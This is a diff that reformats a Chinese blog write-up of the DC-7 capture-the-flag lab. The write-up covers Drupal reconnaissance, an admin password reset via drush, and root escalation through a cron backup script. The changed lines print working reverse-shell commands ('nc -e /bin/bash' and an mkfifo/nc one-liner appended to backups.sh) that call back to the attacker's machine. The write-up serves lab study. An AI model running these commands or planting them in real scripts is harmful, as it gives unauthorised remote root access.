@@ -1,9 +1,10 @@
 ---
 link: https://blog.csdn.net/2403_88102829/article/details/157507034
 title: dc7打靶报告
-description: 文章浏览阅读390次，点赞8次，收藏7次。开放端口：22(SSH)、80(HTTP)——cms是drupal 8，服务器是Apache。左下角有一个add content ，我们试试能不能写个马进去，发现文本格式没有php的。cat一下mbox发现几个root发的邮件，有一个定时任务。再回去artical编辑那里，发现文本形式可以选择php了。因为之前开放了22端口，直接用这组密码远程连接试试。执行该脚本时，就能获得一个root shell。ls发现有一个mbox，一个backups。看看存储库里的每个文件，方向对了。Drupal网站备份数据库。
+description: 记录 DC-7 靶机从端口与 Drupal 信息收集、内容管理入口利用，到凭据发现、定时任务分析和本地提权的完整复现过程。
+excerpt: 记录 DC-7 靶机从端口与 Drupal 信息收集、内容管理入口利用，到凭据发现、定时任务分析和本地提权的完整复现过程。
 keywords: android
-author: Le_ee 博客等级 码龄1年
+author: Lee
 date: 2026-02-05T03:02:10.767Z
 categories:
   - 靶场复现
@@ -11,11 +12,8 @@ tags:
   - DC靶场
   - Drupal
   - Linux
-publisher: null
-stats: paragraph=77 sentences=63, words=249
 ---
 
-<meta name="referrer" content="no-referrer"/>
 环境：
 
 **攻击机ip**：Kali192.168.145.128
@@ -30,7 +28,7 @@ stats: paragraph=77 sentences=63, words=249
 
 识别开放端口和操作系统
 
-`nmap -A -p-&#xA0;192.168.145.189`
+`nmap -A -p- 192.168.145.189`
 
 开放端口：22(SSH)、80(HTTP)——cms是drupal 8，服务器是Apache
 
@@ -44,9 +42,9 @@ stats: paragraph=77 sentences=63, words=249
 
 ![](https://i-blog.csdnimg.cn/direct/e15a3e0819154286ad27f2f7130dc531.png)
 
-`dirsearch -u http://192.168.145.189 -i 200&#xFF0C;&#x6307;&#x5B9A;&#x72B6;&#x6001;&#x7801;200&#x626B;&#x5B50;url`
+`dirsearch -u http://192.168.145.189 -i 200，指定状态码200扫子url`
 
-`&#x9010;&#x4E2A;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x9875;&#x9762;&#x6709;&#x6709;&#x7528;&#x56DE;&#x663E;`
+`逐个尝试一下，发现以下几个页面有有用回显`
 
 ![](https://i-blog.csdnimg.cn/direct/74f6112e69da4ceba55169e743cc6e8d.png)
 
@@ -152,7 +150,7 @@ drush user-password admin --password="newpass123"
 
 `kali:nc -lvnp 1234`
 
-`<strong>&#x865A;&#x62DF;&#x7EC8;&#x7AEF;&#xFF1A;</strong>nc -e /bin/bash 192.168.145.128 1234`
+`<strong>虚拟终端：</strong>nc -e /bin/bash 192.168.145.128 1234`
 
 ![](https://i-blog.csdnimg.cn/direct/470e28979cd74d1c934fd5f5d5194d60.png)
 
@@ -163,11 +161,11 @@ drush user-password admin --password="newpass123"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.145.128 5555 >/tmp/f" >> /opt/scripts/backups.sh
 
 ```
-rm /tmp/f;                    # &#x5220;&#x9664;&#x65E7;&#x7684;&#x7BA1;&#x9053;&#x6587;&#x4EF6;&#xFF08;&#x5982;&#x679C;&#x5B58;&#x5728;&#xFF09;
-mkfifo /tmp/f;                # &#x521B;&#x5EFA;&#x547D;&#x540D;&#x7BA1;&#x9053;&#x6587;&#x4EF6; /tmp/f
-cat /tmp/f |                  # &#x8BFB;&#x53D6;&#x7BA1;&#x9053;&#x5185;&#x5BB9;
-/bin/sh -i 2>&1 |             # &#x542F;&#x52A8;&#x4EA4;&#x4E92;&#x5F0F;shell&#xFF0C;&#x5E76;&#x5C06;&#x9519;&#x8BEF;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;
-nc 192.168.145.128 5555 > /tmp/f  # &#x8FDE;&#x63A5;&#x5230;&#x653B;&#x51FB;&#x8005;&#x673A;&#x5668;(192.168.145.128:5555)&#xFF0C;&#x5E76;&#x5C06;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x7BA1;&#x9053;
+rm /tmp/f;                    # 删除旧的管道文件（如果存在）
+mkfifo /tmp/f;                # 创建命名管道文件 /tmp/f
+cat /tmp/f |                  # 读取管道内容
+/bin/sh -i 2>&1 |             # 启动交互式shell，并将错误输出重定向到标准输出
+nc 192.168.145.128 5555 > /tmp/f  # 连接到攻击者机器(192.168.145.128:5555)，并将接收到的数据写入管道
 ```
 
 等待root执行定时任务
